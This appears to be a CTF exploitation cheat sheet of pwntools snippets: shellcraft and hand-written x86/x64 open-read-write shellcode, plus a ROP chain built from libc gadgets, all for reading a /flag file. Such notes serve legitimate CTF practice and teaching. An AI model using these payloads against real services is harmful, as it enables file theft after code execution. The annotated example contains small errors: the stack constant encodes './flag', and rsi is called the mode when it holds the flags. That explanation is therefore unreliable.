## Cat

```py
asm(shellcraft.cat('/flag'))	# 0x23 bytes
"""
    /* push '/flag\x00' */
    push 0x67
    push 0x616c662f
    /* open(file='esp', oflag='O_RDONLY', mode='edx') */
    mov ebx, esp
    xor ecx, ecx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80
    /* sendfile(out_fd=1, in_fd='eax', offset=0, count=0x7fffffff) */
    push 1
    pop ebx
    mov ecx, eax
    xor edx, edx
    push 0x7fffffff
    pop esi
    /* call sendfile() */
    xor eax, eax
    mov al, 0xbb
    int 0x80
 <class 'str'>
"""
```



## ORW

```py
asm(shellcraft.open('/flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100))
```

If `fp` for read restricted to `0`:

```
asm(shellcraft.close(0) + shellcraft.open('/flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100))
```



## Manually

```python
# gadgets
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
puts_addr = libc_base + libc.sym['puts']

pl = flat({
    # open
    0x0:  p_rdi_r,
    0x8:  heap_addr + 0xb20,    # file name on chunk 
    0x10: p_rsi_r,
    0x18: 0,
    0x20: open_addr,
    # read
    0x28: p_rdi_r,
    0x30: 4,
    0x38: p_rsi_r,
    0x40: heap_addr + 0x3d0,    # empty space
    0x48: p_rdx_r12_r,
    0x50: 30,
    0x58: 30,
    0x60: read_addr,
    # write
    0x68: p_rdi_r,
    0x70: heap_addr + 0x3d0,	# the empty space
    0x78: puts_addr,
    }, filler='\0')
```



## ASM

### 1

```py
shellcode = asm('''
/* open("flag", 0, 0) */
mov rax, 0x67616c662f2e 
push rax
mov rdi, rsp 
mov rsi, 0 
xor rdx, rdx 
mov rax, 2 
syscall
/* read(fd, buf, 0x400) */
mov rdi, rax 
mov rsi,rsp 
mov rdx, 1024 
mov rax,0 
syscall
/* write(1, buf, 0x400) */
mov rdi, 1 
mov rsi, rsp 
mov rdx, rax 
mov rax, 1 
syscall
/* exit */
mov rdi, 0 
mov rax, 60
syscall
''')
```

- **Open**:
  - `0x67616c662f2e`: String `/flag`.
  - `mov rsi, 0`: Sets the `rsi` register to `0`, indicating that the file is being opened with the read-only flag (this is the mode argument to `open`).
  - `xor rdx, rdx`: Clears the `rdx` register, which will be used to indicate default permissions (not relevant for reading).
  - `mov rax, 2`: Moves `2` into `rax`, which is the system call number for `open`.
- **Read**:
  - `mov rdi, rax`: Moves the file descriptor (returned from the `open` system call) into `rdi`, as the first argument for the `read` system call.
  - `mov rsi, rsp`: Moves the stack pointer into `rsi`, which will be used as the buffer to store the file's contents.
  - `mov rdx, 1024`: Sets `rdx` to `1024`, which is the maximum number of bytes to read from the file.
  - `mov rax, 0`: Sets `rax` to `0`, which is the system call number for `read`.
- **Write**:
  - `mov rdi, 1`: Sets `rdi` to `1`, which is the file descriptor for standard output (i.e., the terminal or console).
  - `mov rsi, rsp`: Moves the stack pointer (where the file content is stored) into `rsi`.
  - `mov rdx, rax`: Sets `rdx` to the value in `rax`, which contains the number of bytes read from the previous `read` system call.
  - `mov rax, 1`: Sets `rax` to `1`, which is the system call number for `write`.
- **Exit**:
  - `mov rdi, 0`: Sets `rdi` to `0`, which will be used as the exit status.
  - `mov rax, 60`: Sets `rax` to `60` (0x3C), which is the system call number for `exit`.

### 2

```py
shellcode = f"""
/* open("flag", 0, 0) */
mov rax, {unpack(b"/flag", 'all')}
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

/* read(fd, buf, 0x30) */
sub rsp, 0x30
mov rsi, rsp
mov rdi, rax
mov rdx, 0x30
mov rax, 0
syscall

/* write(1, buf, 0x30) */
mov rdi, 1
mov rax, 1
syscall
hlt
"""
pl += asm(shellcode)
```

